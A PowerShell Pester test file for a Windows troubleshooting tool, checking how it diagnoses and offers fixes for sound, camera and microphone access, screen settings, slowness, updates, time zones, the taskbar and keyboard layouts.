        @{ Name = 'audio unreachable';             Change = @{ Outputs = $null };                                       Finding = 'audioServiceStopped' }
        @{ Name = 'no outputs at all';             Change = @{ Outputs = @() };                                          Finding = 'noOutput' }
        @{ Name = 'the speakers are muted';        Change = @{ Outputs = @((& $out 'Speakers' $true $true)) };           Finding = 'muted' }
        @{ Name = 'the volume is at 2%';           Change = @{ Outputs = @((& $out 'Speakers' $true $false 2)) };        Finding = 'volumeLow' }
        @{ Name = 'sound goes to the monitor';     Change = @{ Outputs = @((& $out 'Speakers'), (& $out 'LG TV (NVIDIA High Definition Audio)' $true)) }; Finding = 'defaultScreen' }
        @{ Name = 'only a monitor, it is default'; Change = @{ Outputs = @((& $out 'LG TV (NVIDIA High Definition Audio)' $true)) }; Finding = 'soundOk' }
        @{ Name = 'sound card switched off';       Change = @{ Problems = @([pscustomobject]@{ Name = 'Realtek Audio'; Class = 'MEDIA'; Code = 22; InstanceId = 'HDAUDIO\x' }) }; Finding = 'deviceDisabled' }
    )
    foreach ($c in $soundCases) {
        It "B1 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcSound (& $sound $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'B1 offers speakers before screens, then a test sound, and can switch back' {
        $r = Test-HcSound (& $sound @{ Outputs = @((& $out 'LG TV (NVIDIA High Definition Audio)' $true), (& $out 'Dell U2415 (AMD High Definition Audio Device)'), (& $out 'Speakers')) })
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('setDefaultAudio', 'setDefaultAudio', 'testSound')
        $r.Actions[0].Target.Label | Should Be 'Speakers'
        $r.Actions[0].Target.PreviousId | Should Be 'id-LG TV (NVIDIA High Definition Audio)'
    }

    It 'B1 offers to unmute and to turn up, remembering the old volume' {
        $muted = Test-HcSound (& $sound @{ Outputs = @((& $out 'Speakers' $true $true 2)) })
        @($muted.Actions | ForEach-Object { $_.FixId }) | Should Be @('unmute', 'setVolume', 'testSound')
        $muted.Actions[1].Target.Previous | Should Be 2
    }

    It 'B1 names the output in the all-good finding' {
        (Test-HcSound (& $sound)).FindingArgs | Should Be @('Speakers (Realtek(R) Audio)')
    }

    $calls = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Microphones = @([pscustomobject]@{ Id = 'm1'; Name = 'Microphone (Webcam)'; IsDefault = $true; Muted = $false; Volume = 80 })
            Cameras = @('HD Webcam'); Problems = @(); Blocks = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $block = { param($cap, $who, $name = $null, $machine = $false)
        [pscustomobject]@{ Capability = $cap; Who = $who; Name = $name; Key = "HKCU:\x\$cap"; Machine = $machine } }
    $callCases = @(
        @{ Name = 'everything allowed';              Change = @{};                                                           Finding = 'callsOk' }
        @{ Name = 'WhatsApp may not use the camera'; Change = @{ Blocks = @(& $block 'webcam' 'app' 'WhatsApp') };           Finding = 'privacyBlocked' }
        @{ Name = 'microphone off for the whole PC'; Change = @{ Blocks = @(& $block 'microphone' 'all' $null $true) };      Finding = 'privacyBlocked' }
        @{ Name = 'the microphone is muted';         Change = @{ Microphones = @([pscustomobject]@{ Id = 'm1'; Name = 'Mic'; IsDefault = $true; Muted = $true; Volume = 80 }) }; Finding = 'micMuted' }
        @{ Name = 'the microphone is at 3%';         Change = @{ Microphones = @([pscustomobject]@{ Id = 'm1'; Name = 'Mic'; IsDefault = $true; Muted = $false; Volume = 3 }) }; Finding = 'micLow' }
        @{ Name = 'no microphone';                   Change = @{ Microphones = @() };                                        Finding = 'noMic' }
        @{ Name = 'no camera';                       Change = @{ Cameras = @() };                                            Finding = 'noCamera' }
    )
    foreach ($c in $callCases) {
        It "B2 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcCalls (& $calls $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'B2 says who is blocked from what, and allows it with the right fix' {
        $r = Test-HcCalls (& $calls @{ Blocks = @((& $block 'webcam' 'app' 'WhatsApp'), (& $block 'microphone' 'all' $null $true)) })
        $r.FindingArgs | Should Be @('No app on this PC', 'microphone')
        @($r.Actions | ForEach-Object { $_.FixId }) | Should Be @('allowAccessMachine', 'allowAccess')
        $r.Actions[1].Target.Label | Should Be 'WhatsApp, camera'
    }

    $screen = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Brightness = $null; ColorFilter = $false; HighContrast = $false; Magnifier = $false; Portrait = $false; Scale = 100; TextSize = 100; Width = $null; Height = $null; Native = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'B3 finds a dark screen, colour filter, high contrast, magnifier and a turned screen' {
        (Test-HcScreen (& $screen)).FindingId | Should Be 'screenOk'
        (Test-HcScreen (& $screen @{ Brightness = 60 })).FindingId | Should Be 'screenOk'
        $dark = Test-HcScreen (& $screen @{ Brightness = 10 })
        $dark.FindingId | Should Be 'tooDark'
        $dark.Actions[0].Target.Previous | Should Be 10
        (Test-HcScreen (& $screen @{ ColorFilter = $true })).FindingId | Should Be 'colorFilter'
        (Test-HcScreen (& $screen @{ HighContrast = $true })).FindingId | Should Be 'highContrast'
        $mag = Test-HcScreen (& $screen @{ Magnifier = $true })
        $mag.FindingId | Should Be 'magnifier'
        $mag.Actions[0].FixId | Should Be 'closeMagnifier'
        (Test-HcScreen (& $screen @{ Portrait = $true })).FindingId | Should Be 'rotated'
    }

    It 'B3 finds why everything is suddenly huge: a low resolution, a high scale, big text' {
        $script:Lang = 'en'
        $qhd = [pscustomobject]@{ Width = 2560; Height = 1440 }
        $fhd = [pscustomobject]@{ Width = 1920; Height = 1080 }
        # Shamil's PC: two screens, the main one at its own resolution.
        $r = Test-HcScreen (& $screen @{ Width = 2560; Height = 1440; Native = @($qhd, $fhd) })
        $r.FindingId | Should Be 'screenOk'
        @($r.Results | ForEach-Object { $_.Text }) -contains 'Resolution 2560 x 1440' | Should Be $true
        $low = Test-HcScreen (& $screen @{ Width = 1280; Height = 720; Native = @($fhd) })
        $low.FindingId | Should Be 'lowResolution'
        $low.FindingArgs | Should Be @('1280 x 720', '1920 x 1080')
        (Test-HcScreen (& $screen @{ Scale = 225 })).FindingId | Should Be 'bigScale'
        (Test-HcScreen (& $screen @{ TextSize = 175 })).FindingId | Should Be 'bigText'
        (Test-HcScreen (& $screen @{ Scale = 150; TextSize = 125 })).FindingId | Should Be 'screenOk'
        # The Magnifier stays the first suspect when both are there.
        (Test-HcScreen (& $screen @{ Magnifier = $true; Scale = 250 })).FindingId | Should Be 'magnifier'
        Test-HcLowResolution 1920 @() | Should Be $null
    }

    It 'reads a privacy block from the registry, per app' {
        $script:ConsentStoreSaved = $script:ConsentStore
        $script:ConsentStore = 'Software\HousecallTest\ConsentStore'
        $base = "HKCU:\$script:ConsentStore\webcam"
        New-Item "$base\5319275A.WhatsAppDesktop_cv1g1gvanyjgm" -Force | Out-Null
        New-Item "$base\NonPackaged" -Force | Out-Null
        Set-ItemProperty $base -Name Value -Value 'Allow'
        Set-ItemProperty "$base\5319275A.WhatsAppDesktop_cv1g1gvanyjgm" -Name Value -Value 'Deny'
        Set-ItemProperty "$base\NonPackaged" -Name Value -Value 'Allow'
        try {
            $blocks = @(Get-HcPrivacyBlocks 'webcam')
            $blocks.Count | Should Be 1
            $blocks[0].Name | Should Be 'WhatsApp'
            $blocks[0].Key | Should Be "$base\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
        } finally {
            Remove-Item 'HKCU:\Software\HousecallTest' -Recurse -Force
            $script:ConsentStore = $script:ConsentStoreSaved
        }
    }

    It 'the audio bridge compiles and lists this PC''s outputs' {
        $outs = Get-HcAudioDevices 0
        $null -eq $outs | Should Be $false
        @($outs | Where-Object { $_.IsDefault }).Count | Should BeLessThan 2
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($soundCases | ForEach-Object { Test-HcSound (& $sound $_.Change) }) +
                       @($callCases | ForEach-Object { Test-HcCalls (& $calls $_.Change) }) +
                       @((Test-HcScreen (& $screen @{ Brightness = 10; Magnifier = $true; ColorFilter = $true; Portrait = $true })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                (T @all) | Should Not Match '\{\d\}|^\['
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'D: slow or freezing' {
    $script:Lang = 'en'
    $item = { param($name, $enabled = $true, $machine = $false)
        [pscustomobject]@{ Name = $name; Value = $name; Machine = $machine; Approved = 'HKCU:\x'; Enabled = $enabled } }
    $perf = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Disk = [pscustomobject]@{ Drive = 'C:'; FreeGB = 180.5; SizeGB = 476.9; FreePercent = 38; Media = 'SSD' }
            RamGB = 16; MemoryUsed = 45; Cpu = 12
            Busy = @([pscustomobject]@{ Name = 'chrome'; Cpu = 5; MemoryMB = 900 })
            UptimeDays = 1
            Startup = @((& $item 'SecurityHealth'), (& $item 'Spotify'), (& $item 'OneDrive'))
            CrashApps = @(); Shutdowns = 0; BlueScreens = 0; Sizes = $null
        }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $disk = { param($free, $pct, $media = 'SSD') [pscustomobject]@{ Drive = 'C:'; FreeGB = $free; SizeGB = 237; FreePercent = $pct; Media = $media } }
    $many = @(1..12 | ForEach-Object { & $item "App$_" })

    $slowCases = @(
        @{ Name = 'a healthy PC';              Change = @{};                                            Finding = 'slowOk' }
        @{ Name = 'a full disk';               Change = @{ Disk = (& $disk 3.1 1) };                    Finding = 'diskFull' }
        @{ Name = 'a nearly full disk';        Change = @{ Disk = (& $disk 20 9) };                     Finding = 'diskLow' }
        @{ Name = 'memory at 95%';             Change = @{ MemoryUsed = 95 };                           Finding = 'memoryFull' }
        @{ Name = 'the processor at 97%';      Change = @{ Cpu = 97 };                                  Finding = 'cpuBusy' }
        @{ Name = 'running for 23 days';       Change = @{ UptimeDays = 23 };                           Finding = 'longUptime' }
        @{ Name = 'Windows on an HDD';         Change = @{ Disk = (& $disk 180 38 'HDD') };             Finding = 'hddSystem' }
        @{ Name = '4 GB of memory';            Change = @{ RamGB = 3.9 };                               Finding = 'lowRam' }
        @{ Name = '12 startup programs';       Change = @{ Startup = $many };                           Finding = 'manyStartup' }
        @{ Name = '12 startup programs, off';  Change = @{ Startup = @(1..12 | ForEach-Object { & $item "App$_" $false }) }; Finding = 'slowOk' }
    )
    foreach ($c in $slowCases) {
        It "D1 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcSlow (& $perf $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'D1 offers to stop startup programs, but never the ones that should stay' {
        $r = Test-HcSlow (& $perf @{ Startup = @((& $item 'SecurityHealth'), (& $item 'RtkAudUService'), (& $item 'OneDrive'), (& $item 'Spotify'), (& $item 'Steam' $true $true)) })
        @($r.Actions | ForEach-Object { "$($_.FixId) $($_.Target.Label)" }) | Should Be @('disableStartup Spotify', 'disableStartupMachine Steam')
    }

    It 'D1 offers to close a program hogging the processor, never a system process' {
        $hog = Test-HcSlow (& $perf @{ Cpu = 95; Busy = @([pscustomobject]@{ Name = 'FortniteClient-Win64-Shipping'; Cpu = 70; MemoryMB = 4200 }) })
        @($hog.Actions | Where-Object { $_.FixId -eq 'closeProcess' })[0].Target.Name | Should Be 'FortniteClient-Win64-Shipping'
        $sys = Test-HcSlow (& $perf @{ Cpu = 95; Busy = @([pscustomobject]@{ Name = 'svchost'; Cpu = 70; MemoryMB = 300 }) })
        @($sys.Actions | Where-Object { $_.FixId -eq 'closeProcess' }).Count | Should Be 0
    }

    It 'D2 looks at startup and the disk' {
        (Test-HcSlowStart (& $perf)).FindingId | Should Be 'startOk'
        (Test-HcSlowStart (& $perf @{ Startup = $many })).FindingId | Should Be 'manyStartup'
        (Test-HcSlowStart (& $perf @{ Startup = $many; Disk = (& $disk 180 38 'HDD') })).FindingId | Should Be 'hddSystem'
    }

    It 'D3 finds crashing programs, blue screens and sudden power-offs' {
        (Test-HcCrashes (& $perf)).FindingId | Should Be 'crashOk'
        $crash = Test-HcCrashes (& $perf @{ CrashApps = @([pscustomobject]@{ Name = 'WINWORD'; Count = 6 }) })
        $crash.FindingId | Should Be 'crashes'
        $crash.FindingArgs | Should Be @('WINWORD', 6)
        (Test-HcCrashes (& $perf @{ CrashApps = @([pscustomobject]@{ Name = 'WINWORD'; Count = 1 }) })).FindingId | Should Be 'someCrashes'
        (Test-HcCrashes (& $perf @{ BlueScreens = 2; CrashApps = @([pscustomobject]@{ Name = 'x'; Count = 9 }) })).FindingId | Should Be 'blueScreens'
        (Test-HcCrashes (& $perf @{ Shutdowns = 3 })).FindingId | Should Be 'shutdowns'
    }

    It 'D4 has its own findings, and offers the clean-ups that are worth it' {
        $full = Test-HcDiskSpace (& $perf @{ Disk = (& $disk 3.1 1); Sizes = [pscustomobject]@{ TempGB = 2.3; BinGB = 0.04; DownloadsGB = 12 } })
        $full.FindingId | Should Be 'spaceFull'
        @($full.Actions | ForEach-Object { $_.FixId }) | Should Be @('emptyTemp')
        $ok = Test-HcDiskSpace (& $perf @{ Sizes = [pscustomobject]@{ TempGB = 0.1; BinGB = 1.5; DownloadsGB = 1 } })
        $ok.FindingId | Should Be 'diskOk'
        $ok.FindingArgs | Should Be @('C:', 180.5)
        @($ok.Actions | ForEach-Object { $_.FixId }) | Should Be @('emptyRecycleBin')
        (Test-HcDiskSpace (& $perf @{ Disk = (& $disk 180 38 'HDD') })).FindingId | Should Be 'diskOk'
    }

    It 'switches a startup program off the way Task Manager does, and back' {
        $key = 'HKCU:\Software\HousecallTest\StartupApproved\Run'
        New-Item $key -Force | Out-Null
        try {
            $t = @{ Label = 'Spotify'; Approved = $key; Value = 'Spotify' }
            & $script:Fixes.disableStartup.Apply $t
            (Get-ItemProperty $key).Spotify[0] | Should Be 3
            & $script:Fixes.disableStartup.Undo $t
            $null -eq (Get-ItemProperty $key -ErrorAction SilentlyContinue).Spotify | Should Be $true
            Set-ItemProperty $key -Name Spotify -Value ([byte[]](2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) -Type Binary
            $t2 = @{ Label = 'Spotify'; Approved = $key; Value = 'Spotify' }
            & $script:Fixes.disableStartup.Apply $t2
            & $script:Fixes.disableStartup.Undo $t2
            (Get-ItemProperty $key).Spotify[0] | Should Be 2
        } finally {
            Remove-Item 'HKCU:\Software\HousecallTest' -Recurse -Force
        }
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($slowCases | ForEach-Object { Test-HcSlow (& $perf $_.Change) }) +
                       @((Test-HcCrashes (& $perf @{ CrashApps = @([pscustomobject]@{ Name = 'x'; Count = 5 }); BlueScreens = 1; Shutdowns = 1 })),
                         (Test-HcDiskSpace (& $perf @{ Disk = (& $disk 3 1); Sizes = [pscustomobject]@{ TempGB = 2; BinGB = 2; DownloadsGB = 2 } })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]|\{\d\}' }).Count | Should Be 0
                $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                (T @all) | Should Not Match '\{\d\}|^\['
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'E: Windows and updates' {
    $script:Lang = 'en'
    $now = [datetime]'2026-09-26 10:00'
    $upd = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Now = $now; ServiceDisabled = $false; RebootPending = $false; PausedUntil = $null; Windows10 = $false
            History = [pscustomobject]@{ Known = $true; LastSuccess = [datetime]'2026-09-12'; Failures = @() }
            Disk = [pscustomobject]@{ Drive = 'C:'; FreeGB = 180; SizeGB = 476; FreePercent = 38; Media = 'SSD' }
        }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $fail = [pscustomobject]@{ Known = $true; LastSuccess = [datetime]'2026-09-12'; Failures = @([pscustomobject]@{ Title = '2026-09 Cumulative Update'; Code = '0x800F0922' }) }

    $updCases = @(
        @{ Name = 'up to date';                 Change = @{};                                                               Finding = 'updatesOk' }
        @{ Name = 'Windows 10';                 Change = @{ Windows10 = $true };                                           Finding = 'windows10' }
        @{ Name = 'the service switched off';   Change = @{ ServiceDisabled = $true; Windows10 = $true };                  Finding = 'updateServiceDisabled' }
        @{ Name = 'paused until October';       Change = @{ PausedUntil = [datetime]'2026-10-10' };                        Finding = 'updatesPaused' }
        @{ Name = 'a pause that has run out';   Change = @{ PausedUntil = [datetime]'2026-08-01' };                        Finding = 'updatesOk' }
        @{ Name = 'a restart waiting';          Change = @{ RebootPending = $true };                                       Finding = 'rebootPending' }
        @{ Name = 'a failed update';            Change = @{ History = $fail };                                             Finding = 'updateFailures' }
        @{ Name = 'nothing for 80 days';        Change = @{ History = [pscustomobject]@{ Known = $true; LastSuccess = [datetime]'2026-07-08'; Failures = @() } }; Finding = 'updatesStale' }
        @{ Name = 'too little space';           Change = @{ Disk = [pscustomobject]@{ Drive = 'C:'; FreeGB = 4.2; SizeGB = 118; FreePercent = 3; Media = 'SSD' } }; Finding = 'updateSpace' }
    )
    foreach ($c in $updCases) {
        It "E1 finds '$($c.Finding)' when: $($c.Name)" { (Test-HcUpdates (& $upd $c.Change)).FindingId | Should Be $c.Finding }
    }

    It 'E1 offers the matching fixes' {
        @((Test-HcUpdates (& $upd @{ ServiceDisabled = $true })).Actions)[0].FixId | Should Be 'enableUpdateService'
        @((Test-HcUpdates (& $upd @{ PausedUntil = [datetime]'2026-10-10' })).Actions)[0].FixId | Should Be 'resumeUpdates'
        @((Test-HcUpdates (& $upd @{ History = $fail })).Actions)[0].FixId | Should Be 'resetUpdates'
        @((Test-HcUpdates (& $upd)).Actions).Count | Should Be 0
    }

    $err = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Activated = $true; ClockOffset = 1; RebootPending = $false; Crashes = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'E2 finds a wrong clock, no activation, a waiting restart and a crashing program' {
        (Test-HcErrors (& $err)).FindingId | Should Be 'errorsOk'
        $clock = Test-HcErrors (& $err @{ ClockOffset = -3700 })
        $clock.FindingId | Should Be 'clockWrong'
        $clock.FindingArgs | Should Be @(62)
        @($clock.Actions | ForEach-Object { $_.FixId }) | Should Be @('syncClock', 'repairWindows')
        (Test-HcErrors (& $err @{ ClockOffset = $null })).FindingId | Should Be 'errorsOk'
        (Test-HcErrors (& $err @{ Activated = $false })).FindingId | Should Be 'notActivated'
        (Test-HcErrors (& $err @{ RebootPending = $true })).FindingId | Should Be 'rebootPending'
        (Test-HcErrors (& $err @{ Crashes = @([pscustomobject]@{ Name = 'EXCEL'; Count = 2 }) })).FindingArgs | Should Be @('EXCEL')
    }

    It 'E2 finds a time zone that does not fit the country, by its clock and not its name' {
        $zone = { param($id) [TimeZoneInfo]::FindSystemTimeZoneById($id) }
        $tz = { param($id, $country = 'NL', [hashtable]$c = @{})
            $f = & $err $c
            $f | Add-Member TimeZone (& $zone $id)
            $f | Add-Member Country $country
            $f | Add-Member AutoTimeOff $false
            $f }
        (Test-HcErrors (& $tz 'W. Europe Standard Time')).FindingId | Should Be 'errorsOk'          # Shamil's PC
        (Test-HcErrors (& $tz 'Central Europe Standard Time')).FindingId | Should Be 'errorsOk'     # the same clock
        $wrong = Test-HcErrors (& $tz 'GMT Standard Time')
        $wrong.FindingId | Should Be 'wrongTimeZone'
        $fix = @($wrong.Actions | Where-Object { $_.FixId -eq 'setTimeZone' })[0]
        $fix.Target.Id | Should Be 'W. Europe Standard Time'
        $fix.Target.Previous | Should Be 'GMT Standard Time'
        (Test-HcErrors (& $tz 'GMT Standard Time' 'XX')).FindingId | Should Be 'errorsOk'           # an unknown country is not judged
        (Test-HcErrors (& $tz 'W. Europe Standard Time' 'BE')).FindingId | Should Be 'errorsOk'    # Brussels runs the same clock
        $drift = & $tz 'W. Europe Standard Time'
        $drift.AutoTimeOff = $true
        (Test-HcErrors $drift).FindingId | Should Be 'autoTimeOff'
    }

    It 'E3 finds a waiting restart, fast startup and a long uptime' {
        $sd = { param([hashtable]$c = @{}) $f = [pscustomobject]@{ RebootPending = $false; FastStartup = $false; UptimeDays = 1 }; foreach ($k in $c.Keys) { $f.$k = $c[$k] }; $f }
        (Test-HcShutdown (& $sd)).FindingId | Should Be 'shutdownOk'
        (Test-HcShutdown (& $sd @{ RebootPending = $true; FastStartup = $true })).FindingId | Should Be 'rebootPending'
        $fast = Test-HcShutdown (& $sd @{ FastStartup = $true })
        $fast.FindingId | Should Be 'fastStartup'
        $fast.Actions[0].FixId | Should Be 'disableFastStartup'
        (Test-HcShutdown (& $sd @{ UptimeDays = 30 })).FindingId | Should Be 'longUptime'
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($updCases | ForEach-Object { Test-HcUpdates (& $upd $_.Change) }) +
                       @((Test-HcErrors (& $err @{ ClockOffset = 900; Activated = $false; Crashes = @([pscustomobject]@{ Name = 'x'; Count = 1 }) })),
                         (Test-HcShutdown ([pscustomobject]@{ RebootPending = $true; FastStartup = $true; UptimeDays = 12 })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]|\{\d\}' }).Count | Should Be 0
                $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                (T @all) | Should Not Match '\{\d\}|^\['
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'G1: desktop, taskbar and folders' {
    $script:Lang = 'en'
    $shell = { param([hashtable]$Change = @{})
        $f = [pscustomobject]@{
            TempProfile = $false; ExplorerRunning = $true; ExplorerHung = $false; IconsHidden = $false
            RecycleBinHidden = $false; DesktopItems = 12; DesktopInOneDrive = $false; OneDriveRunning = $false
            TaskbarAutoHide = $false; SearchHidden = $false; TabletMode = $false; Windows10 = $false
        }
        foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
        $f }
    $fixIds = { param($r) @($r.Actions | ForEach-Object { $_.FixId }) }

    It 'finds nothing on a normal PC, and still offers the harmless Explorer restart' {
        $r = Test-HcShell (& $shell)
        $r.FindingId | Should Be 'shellOk'
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
        (& $fixIds $r) | Should Be @('restartExplorer')
    }

    It 'puts a temporary profile first, whatever else is wrong' {
        $r = Test-HcShell (& $shell @{ TempProfile = $true; IconsHidden = $true; TaskbarAutoHide = $true })
        $r.FindingId | Should Be 'tempProfile'
        $r.Results[0].Status | Should Be 'problem'
    }

    It 'restarts Explorer first when it is not running or frozen' {
        $r = Test-HcShell (& $shell @{ ExplorerRunning = $false; IconsHidden = $true })
        $r.FindingId | Should Be 'explorerMissing'
        (& $fixIds $r)[0] | Should Be 'restartExplorer'
        @((& $fixIds $r) | Where-Object { $_ -eq 'restartExplorer' }).Count | Should Be 1
        (Test-HcShell (& $shell @{ ExplorerHung = $true })).FindingId | Should Be 'explorerHung'
    }

    It 'shows hidden desktop icons, a hidden search box, the taskbar and the Recycle Bin, each with its own fix' {
        $r = Test-HcShell (& $shell @{ IconsHidden = $true; SearchHidden = $true; TaskbarAutoHide = $true; RecycleBinHidden = $true })
        $r.FindingId | Should Be 'iconsHidden'
        (& $fixIds $r) | Should Be @('showDesktopIcons', 'showRecycleBin', 'taskbarStay', 'showSearch', 'restartExplorer')
        (Test-HcShell (& $shell @{ TaskbarAutoHide = $true })).FindingId | Should Be 'taskbarAutoHide'
        (Test-HcShell (& $shell @{ SearchHidden = $true })).FindingId | Should Be 'searchHidden'
    }

    It 'points to OneDrive only when the desktop lives there and OneDrive is off' {
        (Test-HcShell (& $shell @{ DesktopInOneDrive = $true; OneDriveRunning = $false })).FindingId | Should Be 'desktopOneDrive'
        (Test-HcShell (& $shell @{ DesktopInOneDrive = $true; OneDriveRunning = $true })).FindingId | Should Be 'shellOk'
    }

    It 'only mentions tablet mode on Windows 10' {
        (Test-HcShell (& $shell @{ TabletMode = $true; Windows10 = $true })).FindingId | Should Be 'tabletMode'
        (Test-HcShell (& $shell @{ TabletMode = $true; Windows10 = $false })).FindingId | Should Be 'shellOk'
    }

    It 'reads auto-hide from the stored copy when the live call is not available' {
        Test-HcTaskbarAutoHide ([byte[]](0x30, 0, 0, 0, 0xFE, 0xFF, 0xFF, 0xFF, 0x03, 0x08)) | Should Be $true
        Test-HcTaskbarAutoHide ([byte[]](0x30, 0, 0, 0, 0xFE, 0xFF, 0xFF, 0xFF, 0x02, 0x08)) | Should Be $false
        Test-HcTaskbarAutoHide $null | Should Be $false
    }

    It 'keeps the taskbar visible live, without restarting Explorer, and undoes it the same way' {
        Mock Restart-HcExplorer { }
        Mock Get-HcTaskbarState { 3 }
        $script:TaskbarSet = New-Object System.Collections.ArrayList
        Mock Set-HcTaskbarState { [void]$script:TaskbarSet.Add($State) }
        $t = @{}
        & $script:Fixes.taskbarStay.Apply $t
        & $script:Fixes.taskbarStay.Undo $t
        @($script:TaskbarSet) | Should Be @(2, 3)
        Assert-MockCalled Restart-HcExplorer -Times 0 -Exactly
    }

    It 'reads "no icons" from the desktop''s view flags, the setting Windows really uses' {
        Test-HcIconsHidden 0 0x48201224 | Should Be $true          # Shamil's PC: HideIcons says shown, the flags say hidden
        Test-HcIconsHidden 1 0x48200224 | Should Be $false
        Test-HcIconsHidden 1 $null | Should Be $true               # no view flags yet: the copy counts
        Test-HcIconsHidden 0 $null | Should Be $false
        Test-HcIconsHidden 0 ([int32]-2147479004) | Should Be $true  # a flag word with the top bit set comes back negative
    }

    It 'shows the icons by clearing the flag and HideIcons, and puts both back on undo' {
        Mock Restart-HcExplorer { }
        Mock Get-ItemProperty { [pscustomobject]@{ HideIcons = 1; FFlags = 0x48201224 } }
        $script:ShellSet = New-Object System.Collections.ArrayList
        # No {0} in a Pester 3 mock body: Pester formats the body as a string itself.
        Mock New-ItemProperty { [void]$script:ShellSet.Add($Name + '=0x' + (ConvertTo-HcUInt32 $Value).ToString('X8')) }
        $t = @{}
        & $script:Fixes.showDesktopIcons.Apply $t
        @($script:ShellSet) | Should Be @('HideIcons=0x00000000', 'FFlags=0x48200224')
        & $script:Fixes.showDesktopIcons.Undo $t
        @($script:ShellSet)[2..3] | Should Be @('HideIcons=0x00000001', 'FFlags=0x48201224')
        Assert-MockCalled Restart-HcExplorer -Times 2 -Exactly
    }

    It 'is on the menu as area G, with G1, G2 and G3 built' {
        (Resolve-HcChoice 'G').Kind | Should Be 'area'
        (Resolve-HcChoice 'g1').Value | Should Be 'G1'
        foreach ($code in 'G1', 'G2', 'G3') { $script:ProblemHandlers[$code] | Should Be "Invoke-Hc$code" }
    }
}

Describe 'C2: the keyboard types the wrong characters' {
    $script:Lang = 'en'
    $layout = { param($klid, $name, $tag = 'nl-NL', $tip = $null)
        [pscustomobject]@{ Tag = $tag; Tip = $(if ($tip) { $tip } else { '0413:' + $klid }); Klid = $klid; Name = $name } }
    $kb = { param([hashtable]$Change = @{})
        $k = [pscustomobject]@{ Layouts = @(& $layout '00000409' 'US' 'en-NL' '0409:00000409'); StickyKeys = $false; FilterKeys = $false; NumLock = $true }
        foreach ($key in $Change.Keys) { $k.$key = $Change[$key] }
        [pscustomobject]@{ Problems = @(); Keyboards = 1; Pointers = 1; UsbDrives = @(); Keyboard = $k } }
    $fixIds = { param($r) @($r.Actions | ForEach-Object { $_.FixId }) }

    It 'is happy with one US layout and the switches off (Shamil''s PC)' {
        $r = Test-HcInputDevices (& $kb)
        $r.FindingId | Should Be 'devicesOk'
        @($r.Results | ForEach-Object { $_.Text }) -contains '1 keyboard layout(s): US' | Should Be $true
        @($r.Actions).Count | Should Be 0
    }

    It 'finds the Dutch layout that swaps keys on Dutch-sold keyboards' {
        $r = Test-HcInputDevices (& $kb @{ Layouts = @(& $layout '00000413' 'Dutch') })
        $r.FindingId | Should Be 'wrongLayout'
        $r.FindingArgs | Should Be @('Dutch')
    }

    It 'finds the United Kingdom layout, which English (Netherlands) can get (Shamil''s PC)' {
        $r = Test-HcInputDevices (& $kb @{ Layouts = @(& $layout '00000809' 'United Kingdom' 'en-NL' '2000:00000809') })
        $r.FindingId | Should Be 'wrongLayout'
        $r.FindingArgs | Should Be @('United Kingdom')
        (& $fixIds $r) | Should Be 'openKeyboardSettings'
        (Get-HcSteps $r)[3] | Should Be 'Remove United Kingdom from that list with the three dots > Remove.'
    }

    It 'offers to remove an extra layout, but never a language''s only one' {
        $two = @((& $layout '00020409' 'US-International' 'nl-NL' '0413:00020409'), (& $layout '00000413' 'Dutch' 'nl-NL' '0413:00000413'))
        $r = Test-HcInputDevices (& $kb @{ Layouts = $two })
        $r.FindingId | Should Be 'wrongLayout'             # the cause of wrong keys comes before "two layouts"
        (& $fixIds $r) | Should Be @('removeLayout', 'removeLayout', 'openKeyboardSettings')
        @($r.Actions | Where-Object { $_.FixId -eq 'removeLayout' } | ForEach-Object { $_.Target.Tip }) | Should Be @('0413:00020409', '0413:00000413')
        $apart = @((& $layout '00000409' 'US' 'en-US' '0409:00000409'), (& $layout '00000413' 'Dutch' 'nl-NL' '0413:00000413'))
        (& $fixIds (Test-HcInputDevices (& $kb @{ Layouts = $apart }))) | Should Be 'openKeyboardSettings'
    }

